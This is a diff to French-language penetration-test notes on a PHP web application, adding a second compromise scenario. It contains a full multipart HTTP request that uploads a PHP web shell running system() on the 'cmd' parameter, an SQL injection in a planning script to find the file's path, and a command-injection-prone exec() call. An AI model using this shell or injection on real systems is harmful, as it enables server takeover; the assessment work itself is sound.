@@ -109,6 +109,8 @@ Si on maitrise la valeur de $doc, on peut récupérer d'autres dossier sur le se
 
 ## Chemin de compromission
 
+### Scénario 1
+
 Dans le fichier consulterEvenement.php il y a un exec qui est effectué:
 ```php
 exec('convert "upload/'.$plan['chemin'].'.'.$plan['extension'].'" -alpha off -colorspace RGB -page a4 -quality 80 "upload/tmp/'.$tmp.'/img.jpg"', $output, $return_var);
@@ -216,4 +218,81 @@ for ($i = 0; $i < count($_FILES['fichiers']['name']); $i++) {
 ![[Pasted image 20260422112255.png]]
 
 ![[screenshot_85.png]]
+
+### Scénario 2
+
+Grace à l'ACL qui permet d'appeler toutes les fonctions du fichier `recup_ajax.ph`, on peux utiliser la méthode `addFichiersEvenementChantier` pour ajouter une payload php dans le repertoire upload
+
+```
+POST /recup_ajax.php HTTP/1.1
+Host: exemple.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
+Cookie: PHPSESSID=xxxx
+
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="fonction"
+
+addFichiersEvenementChantier
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="evenement"
+
+test
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="commentaires"
+
+test
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="type"
+
+PLAN
+------WebKitFormBoundary7MA4YWxk
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: application/x-php
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+
+------WebKitFormBoundary7MA4YWxk--
+```
+
+![[Pasted image 20260423115339.png]]
+
+Cependant, on ne connait pas son chemin. Mais on peut le récupérer via une SQLi comme celle présente dans `genererPlanningIndisponibilites.php`:
+
+![[Pasted image 20260423120439.png]]
+
+![[Pasted image 20260423120453.png]]
+
+```
+$secteur = test'
+```
+
+
+```sql
+('SELECT *
+
+FROM SALARIE
+
+WHERE archive=0
+
+AND contrat != 5 AND contrat != 6 AND contrat != 7 AND contrat != 8
+
+AND agence='.$secteur.'
+
+ORDER BY nom')
+```
 
